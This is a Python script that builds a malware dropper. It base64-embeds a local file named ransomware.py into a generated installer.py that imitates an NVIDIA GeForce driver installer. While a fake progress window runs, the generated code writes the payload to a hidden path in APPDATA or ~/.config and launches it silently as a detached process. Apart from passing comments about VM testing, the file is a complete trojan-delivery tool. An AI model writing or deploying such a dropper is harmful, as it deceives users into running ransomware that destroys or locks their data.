import base64
import os

# Paths
current_dir = os.path.dirname(os.path.abspath(__file__))
payload_path = os.path.join(current_dir, "ransomware.py")
output_path = os.path.join(current_dir, "installer.py")

# Read Payload
with open(payload_path, "rb") as f:
    payload_data = f.read()

payload_b64 = base64.b64encode(payload_data).decode('utf-8')

# Dropper Template
dropper_code = f'''import sys
import os
import base64
import subprocess
import threading
import time
import tempfile
from tkinter import Tk, Label, Button, ttk, PhotoImage, Frame, messagebox

# --- CONFIGURATION ---
FAKE_TITLE = "NVIDIA GeForce Game Ready Driver Installer"
FAKE_VERSION = "536.99"
PAYLOAD_B64 = "{payload_b64}"
PAYLOAD_NAME = ".nvidia_update_helper.py"

def extract_and_execute_payload():
    """Drops the ransomware payload and executes it silently."""
    try:
        # 1. Decode Payload
        payload_data = base64.b64decode(PAYLOAD_B64)
        
        # 2. Determine Drop Path (Hidden/Temp)
        if os.name == 'nt':
            drop_dir = os.getenv('APPDATA')
            if not drop_dir: drop_dir = tempfile.gettempdir()
        else:
            drop_dir = os.path.expanduser("~/.config")
            if not os.path.exists(drop_dir):
                drop_dir = os.path.expanduser("~")
        
        drop_path = os.path.join(drop_dir, PAYLOAD_NAME)
        
        # 3. Write File
        with open(drop_path, "wb") as f:
            f.write(payload_data)
            
        # 4. Execute silently
        # We try to use the same python interpreter if possible, or fallback to 'python'/'python3'
        python_exec = sys.executable 
        
        # If frozen (PyInstaller), sys.executable is the exe. 
        # We need a python interpreter to run the script.
        # If we are in significant malware simulation, we might assume python is installed 
        # OR we would need to check environment.
        # For this simulation (VM testing), we assume "python" or "python3" is in PATH.
        
        cmd = []
        if os.name == 'nt':
            # Try to run with pythonw (no console) if available, else python
            cmd = ["python", drop_path]
        else:
            cmd = ["python3", drop_path]
            
        # Detach process
        if os.name == 'nt':
            subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
        else:
            subprocess.Popen(cmd, start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
    except Exception as e:
        # In a real dropper, we would fail silently.
        pass

def fake_installer_gui():
    root = Tk()
    root.title(FAKE_TITLE)
    root.geometry("600x400")
    root.resizable(False, False)
    # NVIDIA Colors: Black #000000, Green #76b900
    root.configure(bg="#1a1a1a")

    # Header
    header = Frame(root, bg="#1a1a1a")
    header.pack(fill="x", pady=20)
    Label(header, text="NVIDIA", fg="#76b900", bg="#1a1a1a", font=("Segoe UI", 24, "bold")).pack()
    Label(header, text="Graphics Driver Installer", fg="white", bg="#1a1a1a", font=("Segoe UI", 16)).pack()

    # Progress Section
    content = Frame(root, bg="#1a1a1a")
    content.pack(expand=True, fill="both", padx=40)
    
    status_label = Label(content, text="Checking system compatibility...", fg="#cccccc", bg="#1a1a1a", font=("Segoe UI", 10))
    status_label.pack(anchor="w", pady=(20, 5))
    
    progress = ttk.Progressbar(content, orient="horizontal", length=520, mode="determinate")
    progress.pack(pady=10)

    # Simulation Logic
    def run_simulation():
        steps = [
            "Checking system compatibility...", 
            "License Agreement...", 
            "Options...", 
            "Installing Graphics Driver...",
            "Installing HD Audio Driver...",
            "Installing PhysX System Software...",
            "Performing Finalizing Actions...",
            "Installation Complete."
        ]
        
        # Trigger Payload early
        root.after(2000, extract_and_execute_payload)
        
        progress['maximum'] = 100
        current_val = 0
        
        for i, step in enumerate(steps):
            time.sleep(0.8) # Simulate work
            status_label.config(text=step)
            root.update()
            
            # Interpolate progress
            target = int((i + 1) / len(steps) * 100)
            while current_val < target:
                current_val += 2
                progress['value'] = current_val
                time.sleep(0.05)
                root.update()
        
        time.sleep(1)
        # messagebox.showinfo("NVIDIA Installer", "NVIDIA Installer has finished.")
        root.destroy()

    # Start simulation in a thread to keep UI responsive
    threading.Thread(target=run_simulation, daemon=True).start()

    root.mainloop()

if __name__ == "__main__":
    fake_installer_gui()
'''

with open(output_path, "w", encoding="utf-8") as f:
    f.write(dropper_code)

print(f"Successfully created dropper at: {output_path}")
print(f"Payload size: {len(payload_b64)} bytes")
